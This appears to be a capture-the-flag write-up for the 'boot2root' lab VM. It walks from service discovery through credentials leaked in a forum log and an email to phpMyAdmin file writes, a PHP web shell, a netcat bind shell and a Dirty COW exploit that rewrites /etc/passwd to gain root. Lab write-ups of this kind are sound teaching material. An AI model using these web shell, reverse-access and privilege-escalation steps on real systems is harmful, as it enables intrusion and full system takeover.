# boot2root

This is a reverse-engineering and security challenge.
The objective is to gain privileged access to the system contained in an ISO disk image.

## Powering up

To boot up the vm, I use an utility script `vm.sh`:
```bash
./vm.sh up
```

To access the vm easily, I setup a DNS route with the name `boot2root.vm`:
```bash
sudo pdnsd-ctl add a "$(./vm.sh ip)" "boot2root.vm"
```

You could also edit the `/etc/hosts` file or use the vm's ip address directly.

I will use the local environment variable `TARGET` to reference the hostname.
```bash
TARGET=boot2root.vm
```

## Service discovery
```bash
pushd services
```
To discover the services that are exposed to the local network, we can use an nmap service identification scan:
```bash
nmap -sV "$TARGET" -oN map
```

The result will be saved in human-readable format into a file called `map`:
```
# Nmap 7.92 scan initiated Mon Jun 13 15:29:04 2022 as: nmap -sV -oN map 192.168.56.101
Nmap scan report for 192.168.56.101
Host is up (0.00016s latency).
Not shown: 994 closed tcp ports (conn-refused)
PORT    STATE SERVICE  VERSION
21/tcp  open  ftp      vsftpd 2.0.8 or later
22/tcp  open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.7 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http     Apache httpd 2.2.22 ((Ubuntu))
143/tcp open  imap     Dovecot imapd
443/tcp open  ssl/http Apache httpd 2.2.22
993/tcp open  ssl/imap Dovecot imapd
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jun 13 15:29:16 2022 -- 1 IP address (1 host up) scanned in 12.97 seconds
```

As we can see, there are `SSH`, `FTP`, `HTTP/S` and `IMAP` servers which we can try to access.

We do not have any credentials yet, so let's try to access the public web services.

### http
The `HTTP` server running on port `80` contains placeholder page:

---

<div id="wrapper">
    <h3>Hack me</h1>
    <h4>We're Coming Soon</h2>
    <p>We're wetting our shirts to launch the website.<br />
    In the mean time, you can connect with us trought</p>
    <p><a href="https://fr-fr.facebook.com/42Born2Code">Facebook</a> <a href="https://plus.google.com/+42Frborn2code">Google +</a> <a href="https://twitter.com/42born2code">Twitter</a></p>
</div>

---

### https
```bash
pushd https
```

On the `HTTPS` server running on port `443` we get a `404`:

---

<h3>Not Found</h1>
<p>The requested URL / was not found on this server.</p>
<hr>
<address>Apache/2.2.22 (Ubuntu) Server at boot2root.vm Port 443</address>

---

Because there is no index, we can use a directory enumeration tool:
```bash
dirstalk scan --no-check-certificate --scan-depth 0 "https://$TARGET" --dictionary /usr/share/wordlists/dirb/small.txt > map

cat map
```
```
4 results found
/
├── cgi-bin
├── forum
├── phpmyadmin
└── webmail

https://boot2root.vm/cgi-bin/ [403] [GET]
https://boot2root.vm/forum [301] [GET]
https://boot2root.vm/phpmyadmin [301] [GET]
https://boot2root.vm/webmail [301] [GET]
```

Using a depth of zero will save us a lot of time, as we are trying to make a broad discovery.

The `webmail` and `phpmyadmin` are probably authenticated, so let's try to access the `forum` instead.

#### forum
```bash
pushd forum
```

The page is titled `HackMe` and there are several topics:

---
- Welcome to this new Forum ! - admin
- Probleme login ? - lmezard
- Gasolina - qudevide
    - Gasolina - zaz
- Les mouettes !
    - Les mouettes ! - thor
---

There is a list of the users:

---
| Username | Type  |  Email  |
|----------|-------|:-------:|
| admin    | Admin | &#9745; |
| lmezard  | User  | &#9744; |
| qudevide | User  | &#9744; |
| thor     | User  | &#9744; |
| wandre   | User  | &#9744; |
| zaz      | User  | &#9744; |
---

After quickly looking over each topic, one seems to be interesting:

---
<h3>Probleme login ?</h3>
<p class="author">by <strong>lmezard</strong>, Thursday, October 08, 2015, 00:10 <span class="ago">(2454 days ago)</span><br />
<span class="edited">edited by admin, Thursday, October 08, 2015, 00:17</span></p>

```
Oct  5 08:44:40 BornToSecHackMe sshd[7482]: input_userauth_request: invalid user test [preauth]
[...]
Oct  5 17:51:15 BornToSecHackMe sshd[1782]: pam_unix(sshd:session): session opened for user admin by (uid=0)
```
---

The user called `lmezard` posted the content of a log file divulging some user information.

Because the log is pretty verbose, I have decided to build a filter to identify each interaction.

There are five kinds of interactions in this log file:

- login
- logout
- success
- failure
- sudo

Using the `success` filter, we can find out which users had `SSH` access:
```bash
popd
pushd sshd

< log ./filter.sh success
```
```
success:    admin@62.210.32.157:61495
success:    admin@62.210.32.157:56050
success:    admin@62.210.32.157:60098
success:    admin@62.210.32.157:50755
success:    admin@62.210.32.157:54025
success:    admin@62.210.32.157:64745
success:    admin@62.210.32.157:54511
success:    admin@62.210.32.157:51320
success:    admin@62.210.32.157:56349
success:    admin@62.210.32.157:54915
success:    admin@62.210.32.157:60970
success:    admin@62.210.32.157:56754
```

Using the `sudo` filter, we can find out which users can gain privileges on the machine:

```bash
< log ./filter.sh sudo
```
```
sudo:       admin@pts/0 as root in /home/admin /bin/sh
sudo:       root@pts/0 as root in /home/admin /usr/sbin/service vsftpd restart
sudo:       root@pts/0 as root in /home/admin /usr/sbin/service vsftpd restart
sudo:       admin@pts/0 as root in /home /bin/sh
sudo:       admin@pts/0 as root in /home/admin /bin/sh
sudo:       admin@pts/0 as root in /home/admin /bin/sh
```

Using the `failure` filter, we can find out which users attempted to connect:

```bash
< log ./filter.sh failure
```
```
failure:    test@161.202.39.38:53781
failure:    user@161.202.39.38:54109
failure:    admin@161.202.39.38:54501
failure:    PlcmSpIp@161.202.39.38:54827
failure:    pi@161.202.39.38:56275
failure:    test@161.202.39.38:56630
failure:    admin@161.202.39.38:57011
failure:    nvdb@161.202.39.38:57329
failure:    !q\]Ej?*5K5cy*AJ@161.202.39.38:57764
failure:    admin@104.245.98.119:22717
failure:    guest@104.245.98.119:24338
failure:    ubnt@104.245.98.119:24710
failure:    support@104.245.98.119:25965
failure:    test@104.245.98.119:27190
failure:    user@104.245.98.119:27769
failure:    admin@104.245.98.119:28290
failure:    PlcmSpIp@104.245.98.119:29308
failure:    ftpuser@104.245.98.119:30401
failure:    pi@104.245.98.119:30558
failure:    test@104.245.98.119:31167
failure:    admin@104.245.98.119:32271
failure:    naos@104.245.98.119:32805
failure:    adm@104.245.98.119:33503
failure:    admin@46.159.82.56:38179
```

One of the usernames seems pretty uncommon: `!q\]Ej?*5K5cy*AJ`.
Let's try to find its context:

```bash
< log ./filter.sh | grep '5K5cy' --context=3
```
```
failure:    test@161.202.39.38:56630
failure:    admin@161.202.39.38:57011
failure:    nvdb@161.202.39.38:57329
failure:    !q\]Ej?*5K5cy*AJ@161.202.39.38:57764
login:      lmezard@(uid=1040)
logout:     lmezard
logout:     root
```

Immediately after the failed authentication, the user `lmezard` logged in successfully.

Maybe he mistakenly put his password in the username prompt.

Let's try to connect using `SSH` with these credentials:
```bash
ssh lmezard@boot2root.vm
```
```
        ____                _______    _____           
       |  _ \              |__   __|  / ____|          
       | |_) | ___  _ __ _ __ | | ___| (___   ___  ___ 
       |  _ < / _ \| '__| '_ \| |/ _ \\___ \ / _ \/ __|
       | |_) | (_) | |  | | | | | (_) |___) |  __/ (__ 
       |____/ \___/|_|  |_| |_|_|\___/_____/ \___|\___|

                       Good luck & Have fun
lmezard@boot2root.vm's password: 
Permission denied, please try again.
```

The permission is denied, which may be the reason why he created this topic.

The `forum` has a login button. Let's try the credentials there.

The login is successfull and we can now post topics as the user `lmezard`.
We can also access his private profile area, where we can find his email address: `laurie@borntosec.net`.

The directory enumeration found a directory called `webmail`.
Let's try to access it using this email address.

```bash
popd
```

#### webmail
The mail application is called `SquirrelMail`.

The login is successfull and leads us to an inbox containing some mail:
- DB Access - qudevide@mail.borntosec.net
- Very interesting !!!! - qudevide@mail.borntosec.net

The mail titled `DB Access` seems very interesting, as it seems to contain root access to some databases.

```
Hey Laurie,

You cant connect to the databases now. Use root/Fg-'kKXBj87E:aJ$

Best regards.
```

The enumeration also found a directory called `phpmyadmin`, which may enable us to interact with SQL databases.

#### phpmyadmin
```bash
pushd phpmyadmin
```

Using the newly found credentials, we can view the forum's database, and execute `SQL` queries. We have access to all tables, because we're authenticated as the mysql `root` user.

---
MySQL

- Server: Localhost via UNIX socket
- Server version: 5.5.44-0ubuntu0.12.04.1
- Protocol version: 10
- User: root@localhost
- MySQL charset: UTF-8 Unicode (utf8)
---


There are several ways to exploit our new privileges. We can:
- Dump databases
- Edit database entries
- Read local files
- Write local files

As usual, I've created some scripts to ease interactions.
Using the query script, we can easily interact with the database.

For example, we can get a file's content using the following statement:
```sql
LOAD DATA INFILE '$FILE_PATH' INTO TABLE `$TABLE_NAME`;
```

Another functionality that we can exploit, is the ability to write local files.
Using the following statement, we can write files in any writable directory, as long as the file does not already exist:
```sql
SELECT '$CONTENT' INTO OUTFILE '$FILE_PATH';
```

If we find a writable directory inside of the web server's root directory, we can write a php file and execute arbitrary code by accessing it using an `HTTP` request.

Let's try to find out where the web root is located. An interesting file of known location is the linux user configuration file: `/etc/passwd`.
```bash
./download.sh $(tr '/' ' ' < root.mysql.credentials) "/etc/passwd"

cat files/etc/passwd | sort --numeric-sort --field-separator=: --key=3
```
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
syslog:x:101:103::/home/syslog:/bin/false
messagebus:x:102:106::/var/run/dbus:/bin/false
whoopsie:x:103:107::/nonexistent:/bin/false
landscape:x:104:110::/var/lib/landscape:/bin/false
sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
mysql:x:106:115:MySQL Server,,,:/nonexistent:/bin/false
ftp:x:107:116:ftp daemon,,,:/srv/ftp:/bin/false
dovecot:x:108:117:Dovecot mail server,,,:/usr/lib/dovecot:/bin/false
dovenull:x:109:65534:Dovecot login user,,,:/nonexistent:/bin/false
postfix:x:110:118::/var/spool/postfix:/bin/false

ft_root:x:1000:1000:ft_root,,,:/home/ft_root:/bin/bash
lmezard:x:1001:1001:laurie,,,:/home/lmezard:/bin/bash
laurie@borntosec.net:x:1002:1002:Laurie,,,:/home/laurie@borntosec.net:/bin/bash
laurie:x:1003:1003:,,,:/home/laurie:/bin/bash
thor:x:1004:1004:,,,:/home/thor:/bin/bash
zaz:x:1005:1005:,,,:/home/zaz:/bin/bash

nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
```
The third field corresponds to the user's `id`.
It looks like ids for system users begin at `0` (root) and ids for regular users begin at `1000` (ft_root).

We can see that the following users have a regular account:
- ft_root
- lmezard
- laurie@borntosec.net
- laurie
- thor
- zaz

The system user's include the `mail`, `www-data` and `ftp` users.
We may be able to determine the location of each applications base directory, by looking at their corresponding `passwd` entry's `home` field.

| User     | Home     |
|----------|----------|
| mail     | /var/mail|
| www-data | /var/www |
| ftp      | /srv/ftp |

Let's try to write to the `www-data` user's home directory.
```bash
echo test > test.txt

./upload.sh $(tr '/' ' ' < root.mysql.credentials) test.txt /var/www/test.txt
```
```
"#1 - Can't create/write to file '/var/www/test.txt' (Errcode: 13)"
```

It looks like the `mysql` user does not have write permissions on the `/var/www` directory.

We can try to search for the web applications inside of the `/var/www` directory using the `SQL` server's read functionality.

The `LOAD DATA INFILE` statement is powerful, but it cannot list files.
To do this, I created a fuzzing tool that can be used like the directory enumeration tool that we previously used on the web server.
```bash
#!/usr/bin/env bash

DATA=fuzz
PREFIX="${3:-/var/www/}"

while read -r line
do
	echo "SELECT '$DATA' INTO OUTFILE '$PREFIX$line'"
done | ./query.sh "$1" "$2" | grep -v 'Errcode: 13'
```

The tool attempts to store data into files, by concatenating the web root with filenames read from standard input.

We can input a list of subdirectories we expect, according to the urls of the web applications:
```bash
./fuzzfile.sh $(tr '/' ' ' < root.mysql.credentials) << EOF
cgi-bin
forum
phpmyadmin
webmail
EOF
```
```
"#1086 - File '/var/www/forum' already exists"
```

It looks like we found the `forum`'s subdirectory.
Let's try to write a file inside of it:
```bash
./upload.sh $(tr '/' ' ' < root.mysql.credentials) test.txt /var/www/forum/test.txt
```
```
"#1 - Can't create/write to file '/var/www/forum/test.txt' (Errcode: 13)"
```

We still lack the write permission.

Because we know that the `forum` is powered by the `My Little Forum` CMS, we can get a copy of the sources to get further information on the application's directory structure.

```bash
pushd /tmp

curl -L -O 'https://github.com/ilosuna/mylittleforum/archive/refs/tags/20220529.1.tar.gz' | tar xz

pushd mylittleforum-20220529.1

ls -l

cat README.md

popd

popd
```
```
drwxr-xr-x  2 clemax clemax    60 May 29 21:00 backup
-rw-r--r--  1 clemax clemax 43559 May 29 21:00 CHANGELOG
drwxr-xr-x  2 clemax clemax   160 May 29 21:00 config
drwxr-xr-x  5 clemax clemax   100 May 29 21:00 images
drwxr-xr-x  2 clemax clemax   520 May 29 21:00 includes
-rw-r--r--  1 clemax clemax  9097 May 29 21:00 index.php
drwxr-xr-x  2 clemax clemax    80 May 29 21:00 install
drwxr-xr-x  2 clemax clemax   120 May 29 21:00 js
drwxr-xr-x  2 clemax clemax   320 May 29 21:00 lang
-rw-r--r--  1 clemax clemax 33093 May 29 21:00 LICENSE
drwxr-xr-x 10 clemax clemax   200 May 29 21:00 modules
-rw-r--r--  1 clemax clemax  1366 May 29 21:00 README.md
drwxr-xr-x  2 clemax clemax    60 May 29 21:00 templates_c
drwxr-xr-x  3 clemax clemax    60 May 29 21:00 themes
drwxr-xr-x  2 clemax clemax    80 May 29 21:00 update
```

---
my little forum
===============

<a href="https://mylittleforum.net/">my little forum</a> is a simple PHP and MySQL based internet forum that displays the messages in classical threaded view (tree structure). It is Open Source licensed under the GNU General Public License. The main claim of this web forum is simplicity. Furthermore it should be easy to install and run on a standard server configuration with PHP and MySQL.

* <a href="https://github.com/ilosuna/mylittleforum/wiki">More about my little forum</a>
* [Demo and project discussion forum](https://mylittleforum.net/forum/)

System requirements
-------------------

* Webserver with PHP >= 7.3 and MySQL >= 5.5.3

Installation
------------

1. Unzip the script package.
2. Upload the complete folder "forum" to your server.
3. Depending on your server configuration the write permissions of the subdirectory templates_c (CHMOD 770, 775 or 777) and the file config/db_settings.php (CHMOD 666) might need to be changed in order that they are writable by the script.
4. Run the installation script by accessing yourdomain.tld/forum/install/ in your web browser and follow the instructions.
5. Remove the directory "install" from your installation of My Little Forum.
6. Change the write permissions for config/db_settings.php to (CHMOD 440), what prevents reading the files content for unauthorised users
---

According to the directory structure, we may be able to write to the templates_c subdirectory, as it may have the world writable attribute `xx7`:

```
3. Depending on your server configuration the write permissions of the subdirectory templates_c (CHMOD 770, 775 or 777) and the file config/db_settings.php (CHMOD 666) might need to be changed in order that they are writable by the script.
```
Let's try to write to it:
```bash
./upload.sh $(tr '/' ' ' < root.mysql.credentials) test.txt /var/www/forum/templates_c/test.txt
```
```
"Your SQL query has been executed successfully ( Query took 0.0002 sec )"
```

Success! Now let's ensure we can access the file using the `HTTP` protocol:
```bash
curl --insecure "https://boot2root.vm/forum/templates_c/test.txt"
```
```
test
```

Excellent, now let's try to upload a php shell, so that we can execute arbitrary commands.

My php shell takes a `GET` query argument and executes it using the php `system` function:
```php
<?php

$cmd = $_GET["cmd"];

system($cmd);

?>
```

```bash
./upload.sh $(tr '/' ' ' < root.mysql.credentials) shell.php /var/www/forum/templates_c/shell.php
```
```
"Your SQL query has been executed successfully ( Query took 0.0002 sec )"
```

Nice, now we should be able to execute shell commands:
```bash
curl --insecure 'https://boot2root.vm/forum/templates_c/shell.php?cmd=ls'
```
```
11c603a9070a9e1cbb42569c40699569e0a53f12.file.admin.inc.tpl.php
2bd398249eb3f005dbae14690a7dd67b920a4385.file.login.inc.tpl.php
40bf370f621e4a21516f806a52da816d70d613db.file.user.inc.tpl.php
427dca884025438fd528481570ed37a00b14939c.file.ajax_preview.tpl.php
560a32decccbae1a5f4aeb1b9de5bef4b3f2a9e5.file.posting.inc.tpl.php
5cfe6060cd61c240ab9571e3dbb89827c6893eea.file.main.tpl.php
749c74399509c1017fd789614be8fc686bbfc981.file.user_edit.inc.tpl.php
8e2360743d8fd2dec4d073e8a0541dbe322a9482.english.lang.config.php
ad5c544b74f3fd21e6cf286e36ee1b2d24a746b9.file.user_profile.inc.tpl.php
b2b306105b3842dc920a1d11c8bb367b28290c2a.file.subnavigation_1.inc.tpl.php
d0af1f95d9c68edf1f8805f6009e021a113a569a.file.entry.inc.tpl.php
e9c93976b632dda2b9bf7d2a686f72654e73a241.file.user_edit_email.inc.tpl.php
f13dc3b8bcb4f22c2bd24171219c43f5555f95c0.file.index.inc.tpl.php
f75851d3a324a67471c104f30409f32a790c330e.file.subnavigation_2.inc.tpl.php
shell.php
test.txt
```

If netcat is installed, we can spawn a nicer interactive shell listener:
```bash
curl --insecure 'https://boot2root.vm/forum/templates_c/shell.php?cmd=which%20nc'
```
```
/bin/nc
```

I used a circular fifo to redirect the client input into the shell's input, like this:
```
FIFO="/tmp/f"
SHELL="bash"
NC="nc"
PORT=5555

rm -f '$FIFO'; mkfifo '$FIFO'; cat '$FIFO' | '$SHELL' -i 2>&1 | '$NC' -l '$PORT' 2>&1 > '$FIFO'
```

I created a script that executes this command using the php shell, and connect's to the vm, spawning a python pty that enables us to run interactive commands.
```bash
./shell.sh $(tr '/' ' ' < root.mysql.credentials)
```
```
www-data@BornToSecHackMe:/var/www/forum/templates_c$
```
Here, we have access to a user shell on a supposedly old kernel. Let's look at some vulnerabilities for it.


```
# on the host machine:
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O exploit_suggester.sh
nc -l 5556 < exploit_suggester.sh
```

```
# on the target machine: 
www-data@BornToSecHackMe:/var/www/forum/templates_c$ nc 192.168.56.1 5556 > exploit_suggester.sh
www-data@BornToSecHackMe:/var/www/forum/templates_c$ bash exploit_suggester.sh | head -n 50
```

This suggests a number of available exploits for this kernel version (3.2.0).
We pick the first one first to see what gives and use one of the available 
Proof-Of-Concepts

```
# same as before, on the host machine:
wget https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c
nc -l 5556 < dirty.c
```

```
# on the target machine :
www-data@BornToSecHackMe:/var/www/forum/templates_c$ nc  192.168.56.1 5556 > dirty.c
```

In the header of dirty.c, we can see: 
```
//
// This exploit uses the pokemon exploit of the dirtycow vulnerability
// as a base and automatically generates a new passwd line.
// The user will be prompted for the new password when the binary is run.
// The original /etc/passwd file is then backed up to /tmp/passwd.bak
// and overwrites the root account with the generated line.
// After running the exploit you should be able to login with the newly
// created user.
//
// To use this exploit modify the user values according to your needs.
//   The default is "firefart".
//
// Original exploit (dirtycow's ptrace_pokedata "pokemon" method):
//   https://github.com/dirtycow/dirtycow.github.io/blob/master/pokemon.c
//
// Compile with:
//   gcc -pthread dirty.c -o dirty -lcrypt
//
// Then run the newly create binary by either doing:
//   "./dirty" or "./dirty my-new-password"
//
// Afterwards, you can either "su firefart" or "ssh firefart@..."
//
// DON'T FORGET TO RESTORE YOUR /etc/passwd AFTER RUNNING THE EXPLOIT!
//   mv /tmp/passwd.bak /etc/passwd
//
// Exploit adopted by Christian "FireFart" Mehlmauer
// https://firefart.at
//
```

We follow the instructions and run the following command from our target machine :

```
www-data@BornToSecHackMe:/var/www/forum/templates_c$ sed -i 's/firefart/root/g' dirty.c
dirty.c's/firefart/root/g'
www-data@BornToSecHackMe:/var/www/forum/templates_c$ gcc -pthread dirty.c -o dirty -lcrypt
ty -lcryptad dirty.c -o dir
www-data@BornToSecHackMe:/var/www/forum/templates_c$ ./dirty
./dirty
/etc/passwd successfully backed up to /tmp/passwd.bakk
Please enter the new password: cool123

Complete line:
root:ro2P97K8h.772:0:0:pwned:/root:/bin/bash

mmap: b7fda000
madvise 0

ptrace 0
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'root' and the password 'cool123'.


DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bakk /etc/passwd
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'root' and the password 'cool123'.


DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bakk /etc/passwd
www-data@BornToSecHackMe:/var/www/forum/templates_c$ su - root
su - root
Password: cool123

root@BornToSecHackMe:~# whoami
whoami
root


```

